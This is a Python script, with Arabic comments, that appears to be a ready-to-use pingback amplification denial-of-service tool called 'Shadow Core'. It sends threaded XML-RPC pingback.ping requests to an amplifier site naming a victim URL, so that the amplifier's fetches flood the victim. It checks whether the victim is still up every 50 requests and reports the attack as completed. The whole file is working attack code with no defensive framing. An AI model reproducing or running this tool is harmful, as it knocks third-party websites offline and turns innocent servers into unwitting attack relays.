#!/usr/bin/env python3
"""
Shadow Core - Pingback Amplifier with HTTP Monitor
يرسل طلبات Pingback عبر المضخم ويراقب حالة الهدف كل 50 طلبًا
"""
import requests
import time
import json
import sys
import concurrent.futures
from datetime import datetime

# تحميل الإعدادات
with open("config.json", "r") as f:
    config = json.load(f)

AMPLIFIER = config["amplifier_url"]
VICTIM = config["victim_url"]
RPM = config["requests_per_minute"]
DURATION = config["duration_minutes"]
THREADS = config.get("threads", 5)

total_requests = RPM * DURATION
delay = 60.0 / RPM

# إحصائيات
amplifier_success = 0
amplifier_fail = 0
victim_responses = []
total_kb = 0

def build_pingback_xml(target):
    return f"""<?xml version="1.0" encoding="utf-8"?>
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>{target}</string></value></param>
<param><value><string>https://physiqueacademy.net</string></value></param>
</params>
</methodCall>"""

def send_pingback():
    """إرسال طلب Pingback إلى المضخم"""
    global amplifier_success, amplifier_fail
    try:
        xml = build_pingback_xml(VICTIM)
        r = requests.post(
            AMPLIFIER,
            data=xml,
            headers={"Content-Type": "text/xml"},
            timeout=5
        )
        if r.status_code == 200:
            amplifier_success += 1
        else:
            amplifier_fail += 1
        return r.status_code
    except:
        amplifier_fail += 1
        return 0

def check_victim_status():
    """فحص حالة الهدف وحجم الاستجابة"""
    global total_kb
    try:
        r = requests.get(VICTIM, timeout=10, headers={"User-Agent": "Mozilla/5.0"})
        status = r.status_code
        size = len(r.content)
        total_kb += size / 1024
        return {
            "status": status,
            "size_kb": size / 1024,
            "time": datetime.now().strftime("%H:%M:%S")
        }
    except Exception as e:
        return {
            "status": f"ERR: {str(e)[:20]}",
            "size_kb": 0,
            "time": datetime.now().strftime("%H:%M:%S")
        }

print(f"""
╔══════════════════════════════════════════════════════════════╗
║  SHADOW CORE - Pingback Amplifier with HTTP Monitor         ║
╚══════════════════════════════════════════════════════════════╝
[*] Amplifier: {AMPLIFIER}
[*] Victim: {VICTIM}
[*] Rate: {RPM} req/min | Duration: {DURATION} min
[*] Total Requests: {total_requests}
[*] Threads: {THREADS}
""")

print(f"{'Time':<10} {'Progress':<12} {'Amp OK':<8} {'Amp Fail':<10} {'Victim Status':<15} {'Victim Size':<12} {'Total KB':<10}")
print("-" * 90)

start_time = time.time()
last_check = start_time
requests_since_check = 0

with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as executor:
    futures = []
    
    for i in range(total_requests):
        futures.append(executor.submit(send_pingback))
        requests_since_check += 1
        
        # كل 50 طلبًا: فحص حالة الهدف
        if requests_since_check >= 50 or i == total_requests - 1:
            # انتظار اكتمال الطلبات الحالية
            time.sleep(0.5)
            
            # فحص الهدف
            victim_status = check_victim_status()
            victim_responses.append(victim_status)
            
            # عرض الإحصائيات
            now = datetime.now().strftime("%H:%M:%S")
            progress = f"{i+1}/{total_requests}"
            
            print(f"{now:<10} {progress:<12} {amplifier_success:<8} {amplifier_fail:<10} {str(victim_status['status']):<15} {victim_status['size_kb']:<12.2f} {total_kb:<10.2f}")
            
            requests_since_check = 0
        
        # تأخير بين الطلبات
        time.sleep(delay / THREADS)

# انتظار اكتمال جميع الطلبات
concurrent.futures.wait(futures)

# فحص نهائي للهدف
final_status = check_victim_status()

print("\n" + "=" * 90)
print(f"[*] ATTACK COMPLETED @ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
print(f"[*] Amplifier Stats:")
print(f"    - Success: {amplifier_success}")
print(f"    - Failed: {amplifier_fail}")
print(f"[*] Victim Final Status: {final_status['status']}")
print(f"[*] Total Data Transferred from Victim: {total_kb/1024:.2f} MB")
